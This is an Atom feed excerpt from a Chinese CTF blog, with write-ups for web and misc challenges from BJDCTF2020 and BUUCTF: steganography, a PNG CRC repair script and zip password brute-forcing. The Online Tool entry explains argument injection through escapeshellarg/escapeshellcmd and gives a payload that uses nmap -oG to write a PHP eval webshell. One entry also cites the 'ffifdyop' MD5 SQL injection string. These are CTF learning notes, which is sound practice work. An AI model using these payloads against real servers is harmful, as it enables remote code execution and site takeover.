<img src="https://Ro1ing.github.io/post-images/1611989042033.png" alt="" loading="lazy"><br>
后来看发现这一步不用这么复杂</p>
<p>数组绕过：</p>
<p>?a[]=1&amp;b[]=2即可</p>
<p>拓展：</p>
<p>’ffifdyop：’129581926211651571912466741651878684928’<br>
ffifdyop：T0Do#’<strong>or’8</strong><br>
129581926211651571912466741651878684928：<strong>’or’6</strong>]!r,b</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]杂项Misc]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/">
        </link>
        <updated>2021-01-30T06:42:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="认真你就输了">认真你就输了</h2>
<p>xls文件打开乱码 看下文件类型</p>
<p>16进制下发现时 压缩包</p>
<p>每个都看看</p>
<p><img src="%E8%AE%A4%E7%9C%9F%E4%BD%A0%E5%B0%B1%E8%BE%93%E4%BA%86.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988979124.png" alt="" loading="lazy"></p>
<h2 id="一叶障目">一叶障目</h2>
<p><img src="%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988982398.png" alt="" loading="lazy"></p>
<pre><code class="language-python">import zlib
import struct
#读文件
file = '1.png'  #注意，1.png图片要和脚本在同一个文件夹下哦~
fr = open(file,'rb').read()
data = bytearray(fr[12:29])
crc32key = eval(str(fr[29:33]).replace('\\x','').replace(&quot;b'&quot;,'0x').replace(&quot;'&quot;,''))
#crc32key = 0xCBD6DF8A #补上0x，copy hex value
#data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00')  #hex下copy grep hex
n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了
for w in range(n):#高和宽一起爆破
    width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节
    for h in range(n):
        height = bytearray(struct.pack('&gt;i', h))
        for x in range(4):
            data[x+4] = width[x]
            data[x+8] = height[x]
            #print(data)
        crc32result = zlib.crc32(data)
        if crc32result == crc32key:
            print(width,height)
            #写文件
            newpic = bytearray(fr)
            for x in range(4):
                newpic[x+16] = width[x]
                newpic[x+20] = height[x]
            fw = open(file+'.png','wb')#保存副本
            fw.write(newpic)
            fw.close
</code></pre>
<p>crc修复脚本</p>
<h2 id="藏藏藏">藏藏藏</h2>
<p>binwalk分离 解压出word文档</p>
<p>文档里有个qr码 扫描得到</p>
<h2 id="你猜我是个啥">你猜我是个啥</h2>
<p>查看文件头 png</p>
<p>图片二维码 扫出来不是</p>
<p><img src="%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988990340.png" alt="" loading="lazy"><br>
佛了</p>
<h2 id="鸡你太美">鸡你太美</h2>
<p>在副本添加文件头</p>
<p><img src="%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988993121.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BUUCTF 2018]Online Tool]]></title>
        <id>https://Ro1ing.github.io/post/buuctf-2018online-tool/</id>
        <link href="https://Ro1ing.github.io/post/buuctf-2018online-tool/">
        </link>
        <updated>2021-01-30T06:41:39.000Z</updated>
        <content type="html"><![CDATA[<p>代码审计php</p>
<p><strong>escapeshellarg和escapeshellcmd使用不当导致rce</strong></p>
<p>两个函数配合使用就会导致多个参数的注入。</p>
<blockquote>
<p>escapeshellarg和escapeshellcmd的功能</p>
<p><strong>escapeshellarg</strong></p>
<p>1.确保用户只传递一个参数给命令<br>
2.用户不能指定更多的参数一个<br>
3.用户不能执行不同的命令</p>
<p><strong>escapeshellcmd</strong></p>
<p>1.确保用户只执行一个命令<br>
2.用户可以指定不限数量的参数<br>
3.用户不能执行不同的命令</p>
</blockquote>
<p>关于escapeshellarg和escapeshellcmd使用不当导致rce</p>
<p>在https://paper.seebug.org/164/有详解</p>
<p>我们在这摘取</p>
<blockquote>
<ol>
<li>传入的参数是：172.17.0.2' -v -d a=1</li>
<li>经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过escapeshellcmd处理后变成'172.17.0.2'\'' -v -d a=1'，这是因为escapeshellcmd对\以及最后那个<strong>不配对儿</strong>的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</li>
<li>最后执行的命令是curl '172.17.0.2'\'' -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。</li>
</ol>
<p>回到mail中，我们的 payload 最终在执行时变成了'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。</p>
<p>使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。</p>
<p>但是我们仍然可以将参数传递给第一个命令。</p>
<p>这意味着我们也可以将新选项传递给命令。</p>
<p>利用漏洞的能力取决于目标可执行文件。</p>
</blockquote>
<pre><code class="language-php">&lt;?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
}&gt; 
</code></pre>
<blockquote>
<p>HTTP_X_FORWARDED_FOR获取到的IP地址</p>
<p>REMOTE_ADDR代表着客户端的IP</p>
<p>这两个都为比较常见的服务器获取ip</p>
</blockquote>
<blockquote>
<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
</blockquote>
<p>这有个system来执行命令有传参。</p>
<p>本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。</p>
<p><strong>-oG</strong>可以实现将命令和结果写到文件</p>
<p>payload可以通过写一个Shell到文件中</p>
<p>由此构造payload：</p>
<blockquote>
<p>'<?php @eval($_POST["hack"]); ?> -oG hack.php '</p>
</blockquote>
<p>转化为：</p>
<blockquote>
<p>''[\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\'''</p>
</blockquote>
<p>输出为：</p>
<blockquote>
<p>&lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \</p>
</blockquote>
<p>菜刀连接即可</p>
<p>参考链接：</p>
<p>http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/</p>
<p>https://note.redmango.top/Online%20Tool(BUUCTF%202018)/</p>
<p>https://paper.seebug.org/164/</p>
<p>https://blog.csdn.net/qq_26406447/article/details/100711933</p>
<p>https://blog.csdn.net/weixin_44077544/article/details/102835099</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTFMisc基础]]></title>
        <id>https://Ro1ing.github.io/post/buuctfmisc-ji-chu/</id>
        <link href="https://Ro1ing.github.io/post/buuctfmisc-ji-chu/">
        </link>
        <updated>2021-01-30T06:38:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="金三胖"><strong>金三胖</strong></h2>
<p>gif 使用fireworks 或其他 图像浏览软件 逐帧查看</p>
<h2 id="二维码"><strong>二维码</strong></h2>
<p>qr码扫下 没有意义 在十六进制编辑器中发现有文件</p>
<p>使用 binwalk分离 4number.txt 和一个压缩包</p>
<p>压缩包 4位数字爆破 获得</p>
<h2 id="n种方法解决"><strong>N种方法解决</strong></h2>
<p>base64图片 是一个二维码 还原 data:image/jpg base64</p>
<h2 id="大白"><strong>大白</strong></h2>
<p>图片明显修改过 宽高度被篡改</p>
<p>使用TweakPNG</p>
<blockquote>
<p>Warning：</p>
<p>Incorrect crc for IHDR chunk (is 6d7c7135, should be 8e14dfcf)</p>
</blockquote>
<p>使用十六进制编辑器修改</p>
<p>回到图片 发现</p>
<h2 id="基础破解"><strong>基础破解</strong></h2>
<blockquote>
<p>你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对==我说了什么了不得的东<br>
西。。</p>
</blockquote>
<p>四位数字 直接爆破 得到base64解密</p>
<h2 id="你竟然赶我走"><strong>你竟然赶我走</strong></h2>
<p>十六进制的最后发现了</p>
<h2 id="lsb"><strong>LSB</strong></h2>
<p>stegsolve解析</p>
<p><img src="LSB.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988768771.png" alt="" loading="lazy"><br>
上面感觉有东西</p>
<p>使用 zsteg 解密一下 无</p>
<p>stegsolve 发现红黄蓝有字</p>
<p><img src="LSB2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988772613.png" alt="" loading="lazy"><br>
生成图片 扫描获得</p>
<h2 id="乌镇峰会种图"><strong>乌镇峰会种图</strong></h2>
<p>十六进制的最后</p>
<h2 id="ningen"><strong>ningen</strong></h2>
<p>binwalk分离</p>
<p>压缩包爆破四位数字 工具ziperello</p>
<p>获得</p>
<h2 id="rar"><strong>rar</strong></h2>
<p>爆破4位</p>
<h2 id="qr"><strong>qr</strong></h2>
<p>扫码</p>
<h2 id="文件中的秘密"><strong>文件中的秘密</strong></h2>
<p>十六进制的中间 发现</p>
<h2 id="镜子里面的世界"><strong>镜子里面的世界</strong></h2>
<p>用stegsloves 分析</p>
<p><img src="%E9%95%9C%E5%AD%90%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%96%E7%95%8C.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988780681.png" alt="" loading="lazy"></p>
<h2 id="小明的保险箱"><strong>小明的保险箱</strong></h2>
<p>binwalk分离 四位密码爆破</p>
<h2 id="爱因斯坦"><strong>爱因斯坦</strong></h2>
<p>binwalk 图片备注中有 压缩包密码</p>
<h2 id="假如给我三天光明"><strong>假如给我三天光明</strong></h2>
<p>解盲文  😦   kmdonowg</p>
<p>听摩斯电码 网上有摩斯电码的音频解析网站 当时是一点一点看的:(</p>
<h2 id="wireshark"><strong>wireshark</strong></h2>
<p>使用wireshark 找到那条http login流量中的数据包</p>
<h2 id="easycap"><strong>easycap</strong></h2>
<p>追踪 TCP流</p>
<h2 id="被嗅探的流量"><strong>被嗅探的流量</strong></h2>
<p>追踪 TCP流 流量包中发现</p>
<h2 id="flag"><strong>FLAG</strong></h2>
<p>stegsloves</p>
<p><img src="FLAG.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988789645.png" alt="" loading="lazy"><br>
文件头是 zip</p>
<p>里面一个二进制文件</p>
<p>使用kali strings</p>
<p><img src="FLAG2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988793153.png" alt="" loading="lazy"></p>
<h2 id="另一个世界"><strong>另一个世界</strong></h2>
<p>十六进制最后一串二进制 转ascii码 得到 koekj3s</p>
<h2 id="荷兰宽带数据泄露"><strong>荷兰宽带数据泄露</strong></h2>
<p>下载附件得到一个conf.bin文件，路由器信息数据，一般包含账号密码。题目并没有提示flag是什么，猜测是账号或者密码加上格式为最终flag。</p>
<p>用RouterPassView查看后，搜索username或者password，最后发现是用户名</p>
<h2 id="来首歌吧"><strong>来首歌吧</strong></h2>
<p>右耳道摩斯密码</p>
<h2 id="隐藏的钥匙"><strong>隐藏的钥匙</strong></h2>
<p>十六进制内</p>
<h2 id="后门查杀"><strong>后门查杀</strong></h2>
<p>include下发现include.php为webshell文件</p>
<p><img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988801371.png" alt="" loading="lazy"><br>
<img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%802.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988804693.png" alt="" loading="lazy"></p>
<h2 id="梅花香自苦寒来"><strong>梅花香自苦寒来</strong></h2>
<h2 id="snake"><strong>snake</strong></h2>
<p>binwalk 分离 将key中字符串解密</p>
<p><img src="snake.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988808332.png" alt="" loading="lazy"><br>
Serpent 有蛇的意思在西方神话是一条巨大的蛇型恶魔</p>
<p>anaconda</p>
<h2 id="神秘龙卷风"><strong>神秘龙卷风</strong></h2>
<p>压缩包 四位数字爆破 Brainfuck和Ook加解密</p>
<p>https://tool.bugku.com/brainfuck/</p>
<h2 id="面具下的-flag"><strong>面具下的 flag</strong></h2>
<p>Brainfuck和Ook加解密</p>
<h2 id="webshell后门"><strong>webshell后门</strong></h2>
<p><img src="webshell%E5%90%8E%E9%97%A8.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988814827.png" alt="" loading="lazy"></p>
<h2 id="被劫持的神秘礼物"><strong>被劫持的神秘礼物</strong></h2>
<p>小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p>
<p>wireshark http数据</p>
<p><img src="%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988818695.png" alt="" loading="lazy"><br>
拼接用户名密码得到adminaadminb</p>
<p>使用md5加密后得到1d240aafe21a86afc11f38a45b541a49</p>
<h2 id="刷新过的图片"><strong>刷新过的图片</strong></h2>
<p>F5隐写</p>
<p><img src="%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988824852.png" alt="" loading="lazy"><br>
kali中 java Extract Misc.jpg</p>
<p>解密出一个伪加密的压缩包</p>
<h2 id="穿越时空的思念"><strong>穿越时空的思念</strong></h2>
<p>摩斯电码</p>
<h2 id="秘密文件"><strong>秘密文件</strong></h2>
<p>binwalk分离文件 爆破密码</p>
<h2 id="我吃三明治"><strong>我吃三明治</strong></h2>
<p>一张图片</p>
<p>使用foremost 解出两张图片</p>
<p>看wp说是 在两张图片连接处 有类似与base32的字符串</p>
<p><img src="%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988838291.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>